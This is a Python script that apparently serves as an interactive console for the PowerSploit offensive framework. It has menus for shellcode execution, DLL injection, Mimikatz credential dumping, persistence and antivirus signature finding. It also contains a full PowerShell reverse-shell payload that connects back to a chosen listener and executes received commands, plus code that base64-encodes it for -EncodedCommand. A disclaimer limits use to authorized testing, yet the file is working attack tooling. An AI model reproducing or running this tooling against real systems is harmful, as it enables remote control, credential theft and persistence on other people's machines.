#!/usr/bin/env python3

"""
Security Notice: This tool is for authorized penetration testing and security research only.
Unauthorized use is strictly prohibited and may violate local, state, and federal laws.
"""

import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)

import sys
import json
import hashlib
import base64
from typing import Union, Any, Optional, Tuple, Dict, List
from pathlib import Path

# Version compatibility check
def check_syntax_compatibility():
    """Ensure script uses modern Python 3 features correctly"""
    if sys.version_info < (3, 8):
        raise RuntimeError(f"Python {sys.version_info.major}.{sys.version_info.minor} detected. This script requires Python 3.8+")

# Call the check early
check_syntax_compatibility()

# Enhanced error handling and validation
import logging
import signal
import tempfile
from contextlib import contextmanager
from datetime import datetime
import asyncio
import os
import platform
import subprocess
import webbrowser
from urllib.parse import quote
from dataclasses import dataclass

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('powersploit_console.log'),
        logging.StreamHandler()
    ]
)

# Global signal handler for graceful shutdown
def signal_handler(signum, frame):
    """Handle interrupt signals gracefully"""
    print("\n[!] Received interrupt signal. Shutting down gracefully...")
    logging.info(f"Script terminated by signal {signum}")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

@dataclass
class ScriptConfig:
    AUTHOR: str = "Solo"
    DESCRIPTION: str = "PowerSploit Framework Management Console"
    VERSION: str = "2.0"
    GITHUB_URL: str = "https://github.com/PowerSploit/PowerSploit"
    REQUIRED_PYTHON: Tuple[int, int] = (3, 8)

config = ScriptConfig()

def check_python_version():
    """Ensure modern Python version is being used"""
    if sys.version_info < config.REQUIRED_PYTHON:
        print(f"Error: Requires Python {'.'.join(map(str, config.REQUIRED_PYTHON))}+")
        sys.exit(1)

def display_banner():
    """Modern banner display using f-strings and box drawing characters"""
    border = "╔" + "═" * 78 + "╗"
    title = f"║ PowerSploit Management Console v{config.VERSION}".ljust(79) + "║"
    empty_line = "║" + " " * 78 + "║"

    print(f"\n{border}")
    print(title)
    print(empty_line)
    print(f"║ Description: {config.DESCRIPTION.ljust(65)}║")
    print(f"║ Author: {config.AUTHOR.ljust(69)}║")
    print(f"║ GitHub: {config.GITHUB_URL.ljust(68)}║")
    print(border.replace("╔", "╚").replace("╗", "╝"))

def validate_file(path: str) -> bool:
    """Modern path validation using pathlib"""
    return Path(path).is_file()

def validate_dir(path: str) -> bool:
    """Directory validation with pathlib"""
    return Path(path).is_dir()

def get_input(prompt: str, validator=None, error_msg: str = "Invalid input") -> str:
    """Synchronous input with validation - Python 3.8+ compatible"""
    while True:
        try:
            user_input = input(prompt).strip()
            if not validator or validator(user_input):
                return user_input
            print(f"{error_msg}. Please try again.")
        except (EOFError, KeyboardInterrupt):
            print("\nOperation cancelled.")
            raise

async def run_powershell(command: str) -> None:
    """Modern async PowerShell execution with error handling"""
    try:
        # Use correct PowerShell executable based on platform
        if platform.system() == "Windows":
            ps_executable = "powershell"
        else:
            ps_executable = "pwsh"  # PowerShell Core for non-Windows

        proc = await asyncio.create_subprocess_exec(
            ps_executable,
            "-Command",
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )

        stdout, stderr = await proc.communicate()

        if stdout:
            print(f"\nOutput:\n{stdout.decode().strip()}")
        if stderr:
            print(f"\nErrors:\n{stderr.decode().strip()}")

    except FileNotFoundError:
        print(f"\nError: PowerShell not found. Please install PowerShell Core or ensure it's in your PATH.")
    except Exception as e:
        print(f"\nExecution error: {str(e)}")

def download_powersploit() -> Optional[str]:
    """Download helper with browser open - made synchronous for Python 3.8 compatibility"""
    print("\nDownloading PowerSploit...")
    try:
        if not webbrowser.open(config.GITHUB_URL):
            print("Please manually visit:", config.GITHUB_URL)

        path = get_input(
            "Enter path where you extracted PowerSploit: ",
            validator=validate_dir,
            error_msg="Directory not found"
        )
        return path
    except Exception as e:
        print(f"Download error: {str(e)}")
        return None

def encode_powershell_payload(payload: str) -> str:
    """Properly encode PowerShell payload using UTF-16LE and base64"""
    try:
        # Convert to UTF-16LE (required for PowerShell -EncodedCommand)
        utf16le_bytes = payload.encode('utf-16le')
        # Encode to base64
        encoded = base64.b64encode(utf16le_bytes).decode('ascii')
        return encoded
    except Exception as e:
        print(f"Encoding error: {str(e)}")
        return ""

async def module_menu(powersploit_path: str) -> None:
    """Modern module menu with type hints"""
    modules: Dict[str, Tuple[str, str]] = {
        "1": ("CodeExecution/Invoke-Shellcode.ps1", "Execute shellcode in memory"),
        "2": ("CodeExecution/Invoke-DllInjection.ps1", "DLL injection attack"),
        "3": ("Exfiltration/Invoke-Mimikatz.ps1", "Credential dumping (Mimikatz)"),
        "4": ("Recon/Invoke-Portscan.ps1", "Network port scanning"),
        "5": ("ScriptModification/Out-EncryptedScript.ps1", "Create encrypted scripts"),
        "6": ("Persistence/Add-Persistence.ps1", "Establish persistence"),
        "7": ("AntivirusBypass/Find-AVSignature.ps1", "AV signature detection"),
        "8": ("Custom", "Specify custom module path")
    }

    while True:
        print("\nAvailable PowerSploit Modules:")
        for key, (path, desc) in modules.items():
            print(f"  {key}. {desc} ({path if key != '8' else 'any script'})")
        print("  9. Return to main menu")

        try:
            choice = get_input(
                "\nSelect module (1-9): ",
                lambda x: x in list(modules.keys()) + ["9"],
                "Please enter a number between 1-9"
            )
        except KeyboardInterrupt:
            return

        if choice == "9":
            return

        if choice == "8":
            script_path = get_input(
                "Enter full path to PowerShell script: ",
                validator=validate_file,
                error_msg="File not found"
            )
            description = "Custom PowerShell script"
        else:
            script_path = str(Path(powersploit_path) / modules[choice][0])
            description = modules[choice][1]

        if not validate_file(script_path):
            print(f"Error: {script_path} not found!")
            continue

        print(f"\nPreparing {description}...")
        print(f"Script location: {script_path}")

        if "Invoke-Mimikatz" in script_path:
            print("\n[!] WARNING: Mimikatz is a powerful credential tool. Use only on authorized systems!")

        try:
            command = get_input(
                "\nEnter PowerShell command to execute (blank to load module only): ",
                lambda x: True  # Accept any input including empty
            )

            ps_command = f"Import-Module '{script_path}'; {command}" if command.strip() else f"Import-Module '{script_path}'"
            await run_powershell(ps_command)
        except KeyboardInterrupt:
            print("\nModule execution cancelled.")

async def main_menu() -> None:
    """Modern main menu with async support"""
    powersploit_path: Optional[str] = None

    while True:
        display_banner()
        print("""
        1. Set PowerSploit Path
        2. List and Run Modules
        3. Download PowerSploit
        4. Generate PowerShell Payload
        5. Help and Documentation
        6. Exit
        """)

        try:
            choice = get_input(
                "Select option (1-6): ",
                lambda x: x in ('1', '2', '3', '4', '5', '6'),
                "Please enter a number between 1-6"
            )
        except KeyboardInterrupt:
            print("\nOperation cancelled.")
            continue

        if choice == "1":
            try:
                powersploit_path = get_input(
                    "Enter PowerSploit directory path: ",
                    validator=validate_dir,
                    error_msg="Directory not found"
                )
                print(f"PowerSploit path set to: {powersploit_path}")
            except KeyboardInterrupt:
                continue

        elif choice == "2":
            if not powersploit_path or not validate_dir(powersploit_path):
                print("\n[!] PowerSploit path not set or invalid!")
                continue
            await module_menu(powersploit_path)

        elif choice == "3":
            try:
                powersploit_path = download_powersploit()
                if powersploit_path:
                    print(f"PowerSploit path set to: {powersploit_path}")
            except KeyboardInterrupt:
                continue

        elif choice == "4":
            print("\nPowerShell Payload Generation")
            try:
                lhost = get_input(
                    "Enter LHOST (listener IP): ",
                    lambda x: len(x.strip()) > 0,
                    "LHOST cannot be empty"
                )
                lport = get_input(
                    "Enter LPORT (listener port): ",
                    lambda x: x.strip().isdigit() and 1 <= int(x.strip()) <= 65535,
                    "Port must be a number between 1-65535"
                )

                payload = f"""$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport})
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{{0}}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String)
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}}
$client.Close()"""

                print("\nGenerated PowerShell payload:")
                print("-" * 80)
                print(payload)
                print("-" * 80)

                # Properly encode the payload
                encoded_payload = encode_powershell_payload(payload)
                if encoded_payload:
                    print("\nBase64 encoded version (for -EncodedCommand):")
                    print("-" * 80)
                    print(encoded_payload)
                    print("-" * 80)
                    print(f"\nUsage: powershell -EncodedCommand {encoded_payload}")

            except KeyboardInterrupt:
                print("\nPayload generation cancelled.")

        elif choice == "5":
            print("\nPowerSploit Help:")
            print("- Set the PowerSploit path first (option 1 or download with option 3)")
            print("- Modules require local administrator privileges")
            print("- Many modules perform in-memory operations to avoid disk writing")
            print("- Use responsibly and only on authorized systems!")
            print(f"\nFor full documentation visit: {config.GITHUB_URL}")
            try:
                get_input("\nPress Enter to continue...", lambda x: True)
            except KeyboardInterrupt:
                continue

        elif choice == "6":
            print("\nExiting PowerSploit Management Console...")
            sys.exit(0)

async def main() -> None:
    """Modern async main entry point"""
    check_python_version()

    try:
        if platform.system() != "Windows":
            print("\n[!] Warning: PowerSploit is designed for Windows systems")
            try:
                confirm = get_input(
                    "Continue anyway? (y/N): ",
                    lambda x: x.lower() in ('y', 'n', ''),
                    "Please enter 'y' for yes or 'n' for no"
                )
                if confirm.lower() != 'y':
                    sys.exit(1)
            except KeyboardInterrupt:
                sys.exit(1)

        await main_menu()
    except KeyboardInterrupt:
        print("\n[!] Script terminated by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Critical error: {str(e)}", file=sys.stderr)
        logging.exception("Critical error occurred")
        sys.exit(1)

if __name__ == "__main__":
    asyncio.run(main())
